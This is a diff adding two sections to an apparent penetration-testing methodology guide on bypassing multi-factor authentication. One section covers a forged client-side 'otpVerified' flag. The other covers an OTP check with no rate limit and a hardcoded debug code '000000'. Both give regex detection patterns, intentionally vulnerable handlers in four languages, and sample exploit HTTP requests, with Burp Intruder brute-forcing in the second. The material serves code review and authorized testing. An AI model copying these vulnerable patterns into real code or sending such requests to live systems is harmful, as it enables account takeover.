@@ -1360,4 +1360,405 @@ If real account data is returned instead of a redirect to the OTP page or a 401,
 {% endstep %}
 {% endstepper %}
 
+***
+
+#### MFA Bypass via Client-Controlled Verification Result (Forging the Second-Factor Outcome
+
+{% stepper %}
+{% step %}
+Map the entire target system using Burp Suite
+{% endstep %}
+
+{% step %}
+Draw the entry points and endpoints in XMind
+{% endstep %}
+
+{% step %}
+Decompile the application based on the programming language used
+{% endstep %}
+
+{% step %}
+Trigger a full successful MFA login while proxying through Burp, paying special attention to multi-step flows where a "verify-otp" call returns a short-lived ticket/token and a separate "finalize" or "exchange" call turns that ticket into a fully authenticated session
+{% endstep %}
+
+{% step %}
+In the decompiled code, locate the handler for the finalize/exchange endpoint and identify exactly which fields it trusts directly from the request body versus which fields it independently re-validates against server-side state (database row, cache entry, signed ticket)
+{% endstep %}
+
+{% step %}
+Check whether the finalize handler accepts a boolean or string field describing the OTP outcome itself (e.g. `otpVerified`, `mfaStatus`, `factorResult`) instead of deriving that outcome from a previously issued, server-signed ticket ID
+{% endstep %}
+
+{% step %}
+If such a field exists and is not cryptographically bound to a prior server-side verification step, the second factor can be forged entirely on the client
+
+**VSCode (Regex Detection)**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+(\.OtpVerified\b)|(\.MfaVerified\b)|(\.FactorVerified\b)|(\.TwoFactorVerified\b)
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+(isOtpVerified\s*\()|(isMfaVerified\s*\()|(getOtpStatus\s*\()|(getFactorResult\s*\()
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+(\[\s*['"]otpVerified['"]\s*\])|(\[\s*['"]otp_verified['"]\s*\])|(\[\s*['"]mfaVerified['"]\s*\])
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+(req\.body\.otpVerified)|(req\.body\.mfaVerified)|(req\.body\.otpStatus)|(req\.body\.factorResult)
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep (Regex Detection(Linux))**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+\.OtpVerified\b|\.MfaVerified\b|\.FactorVerified\b|\.TwoFactorVerified\b
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+isOtpVerified\s*\(|isMfaVerified\s*\(|getOtpStatus\s*\(|getFactorResult\s*\(
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+\[\s*['"]otpVerified['"]\s*\]|\[\s*['"]otp_verified['"]\s*\]|\[\s*['"]mfaVerified['"]\s*\]
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+req\.body\.otpVerified|req\.body\.mfaVerified|req\.body\.otpStatus|req\.body\.factorResult
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Pattern**
+
+{% tabs %}
+{% tab title="C#" %}
+```c#
+public class FinalizeMfaRequest
+{
+    public string Username { get; set; }
+    public bool OtpVerified { get; set; } // [1]
+}
+ 
+[HttpPost("mfa/finalize")]
+public IActionResult FinalizeMfa([FromBody] FinalizeMfaRequest req)
+{
+    if (req.OtpVerified) // [2]
+    {
+        var user = _userRepository.GetByUsername(req.Username);
+        var token = _tokenService.IssueSessionToken(user); // [3]
+        return Ok(new { token });
+    }
+ 
+    return Unauthorized();
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public class FinalizeMfaRequest {
+    private String username;
+    private boolean otpVerified; // [1]
+ 
+    public String getUsername() { return username; }
+    public boolean isOtpVerified() { return otpVerified; }
+}
+ 
+@PostMapping("/mfa/finalize")
+public ResponseEntity<?> finalizeMfa(@RequestBody FinalizeMfaRequest req) {
+    if (req.isOtpVerified()) { // [2]
+        User user = userRepository.getByUsername(req.getUsername());
+        String token = tokenService.issueSessionToken(user); // [3]
+        return ResponseEntity.ok(Map.of("token", token));
+    }
+ 
+    return ResponseEntity.status(401).build();
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+function finalizeMfa($request) {
+    // [1] the verification outcome travels inside the client request body
+    if (!empty($request['otpVerified']) && $request['otpVerified'] === true) { // [2]
+        $user = UserRepository::getByUsername($request['username']);
+        $token = TokenService::issueSessionToken($user); // [3]
+        echo json_encode(['token' => $token]);
+        return;
+    }
+ 
+    http_response_code(401);
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+app.post('/mfa/finalize', async (req, res) => {
+  // [1] the verification outcome travels inside the client request body
+  if (req.body.otpVerified === true) { // [2]
+    const user = await userRepository.getByUsername(req.body.username);
+    const token = tokenService.issueSessionToken(user); // [3]
+    return res.json({ token });
+  }
+ 
+  return res.status(401).end();
+});
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Note the markers: `[1]` the OTP outcome is a plain field on the client-supplied DTO rather than something derived server-side, `[2]` the handler branches purely on that client-controlled value, `[3]` a fully privileged session token is minted with no reference back to a real OTP-verify call, so the value can simply be forged
+{% endstep %}
+
+{% step %}
+Build a request to the finalize endpoint that supplies only the first-factor identity plus the forged outcome field, without ever calling the real verify-otp endpoint, and send it directly
+
+```http
+POST /mfa/finalize HTTP/1.1
+Host: target.tld
+Content-Type: application/json
+Content-Length: 41
+ 
+{"username":"alice","otpVerified":true}
+```
+
+```
+HTTP/1.1 200 OK
+Content-Type: application/json
+ 
+{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
+```
+{% endstep %}
+
+{% step %}
+If a valid, fully authenticated token is returned, the second factor has been bypassed entirely client-side
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### MFA Bypass via Missing Rate Limiting / Attempt Counter on OTP Verification (Brute-Forceable Second Factor)
+
+{% stepper %}
+{% step %}
+Map the entire target system using Burp Suite
+{% endstep %}
+
+{% step %}
+Draw the entry points and endpoints in XMind
+{% endstep %}
+
+{% step %}
+Decompile the application based on the programming language used
+{% endstep %}
+
+{% step %}
+Trigger the OTP-verification endpoint with an intentionally wrong code several times in a row and observe whether the response, status code, latency, or account state changes after repeated failures
+{% endstep %}
+
+{% step %}
+In the decompiled code, locate the handler for the OTP-verify endpoint and trace exactly how the submitted code is compared against the expected value — check whether the comparison happens directly, with no attempt counter or lockout flag read or written beforehand
+{% endstep %}
+
+{% step %}
+Check whether a failed-attempt counter exists at all in the data/session model and, if it exists, whether it is actually enforced (request rejected once a threshold is reached) or only incremented for logging purposes with no enforcement
+{% endstep %}
+
+{% step %}
+Check whether the OTP itself is short and long-lived enough to brute-force within its validity window (a `6-digit` numeric code valid for several minutes, with no per-IP or per-account throttling)
+{% endstep %}
+
+{% step %}
+Check whether the comparison logic accepts any additional fixed value left over from testing/debugging in addition to the real code
+
+**VSCode (Regex Detection)**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+(==\s*expectedCode)|(==\s*"000000")|(==\s*"123456")
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+(\.equals\(\s*expectedCode\))|(\.equals\(\s*"000000"\))|(\.equals\(\s*"123456"\))
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+(==\s*\$expectedCode)|(==\s*['"]000000['"])|(==\s*['"]123456['"])
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+(===\s*expectedCode)|(===\s*['"]000000['"])|(===\s*['"]123456['"])
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep (Regex Detection(Linux))**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+==\s*expectedCode|==\s*"000000"|==\s*"123456"
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+\.equals\(\s*expectedCode\)|\.equals\(\s*"000000"\)|\.equals\(\s*"123456"\)
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+==\s*\$expectedCode|==\s*['"]000000['"]|==\s*['"]123456['"]
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+===\s*expectedCode|===\s*['"]000000['"]|===\s*['"]123456['"]
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Pattern**
+
+{% tabs %}
+{% tab title="C#" %}
+```c#
+[HttpPost("mfa/verify")]
+public IActionResult VerifyOtp([FromBody] VerifyOtpRequest req)
+{
+    var pendingUserId = HttpContext.Session.GetString("PendingUserId");
+    var expectedCode = _otpStore.GetCode(pendingUserId); // [1]
+ 
+    if (req.Code == expectedCode || req.Code == "000000") // [2]
+    {
+        HttpContext.Session.SetString("Authenticated", "true");
+        return Ok();
+    }
+ 
+    return Unauthorized(); // [3]
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+@PostMapping("/mfa/verify")
+public ResponseEntity<?> verifyOtp(@RequestBody VerifyOtpRequest req, HttpSession session) {
+    String pendingUserId = (String) session.getAttribute("pendingUserId");
+    String expectedCode = otpStore.getCode(pendingUserId); // [1]
+ 
+    if (req.getCode().equals(expectedCode) || req.getCode().equals("000000")) { // [2]
+        session.setAttribute("authenticated", true);
+        return ResponseEntity.ok().build();
+    }
+ 
+    return ResponseEntity.status(401).build(); // [3]
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+function verifyOtp($request) {
+    $pendingUserId = $_SESSION['pending_user_id'];
+    $expectedCode = OtpStore::getCode($pendingUserId); // [1]
+ 
+    if ($request['code'] == $expectedCode || $request['code'] == '000000') { // [2]
+        $_SESSION['authenticated'] = true;
+        http_response_code(200);
+        return;
+    }
+ 
+    http_response_code(401); // [3]
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+app.post('/mfa/verify', (req, res) => {
+  const pendingUserId = req.session.pendingUserId;
+  const expectedCode = otpStore.getCode(pendingUserId); // [1]
+ 
+  if (req.body.code === expectedCode || req.body.code === '000000') { // [2]
+    req.session.authenticated = true;
+    return res.status(200).end();
+  }
+ 
+  return res.status(401).end(); // [3]
+});
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Note the markers: `[1]` no attempt counter is read or incremented before the comparison runs, `[2]` a leftover debug bypass value (`000000`) is accepted alongside the real code, `[3]` a failed attempt simply returns 401 with no delay, lockout, or counter increment, so the endpoint can be hit at full request speed
+{% endstep %}
+
+{% step %}
+First test the leftover debug value directly against a captured pending session
+
+```http
+POST /mfa/verify HTTP/1.1
+Host: target.tld
+Content-Type: application/json
+Cookie: session=eyJhbGciOi...
+Content-Length: 17
+ 
+{"code":"000000"}
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+ 
+{"authenticated":true}
+```
+{% endstep %}
+
+{% step %}
+If the debug code does not work, use Burp Intruder against the same pending session cookie to cycle through the full numeric keyspace (`000000`–`999999`) of the OTP and observe whether any request is throttled, delayed, or triggers a lockout
+{% endstep %}
+
+{% step %}
+If the account never locks, throttles, or otherwise reacts after dozens or hundreds of failed attempts, the second factor is brute-forceable within its validity window, confirming the vulnerability\\
+{% endstep %}
+{% endstepper %}
+
+***
+
 ## Cheat Sheet
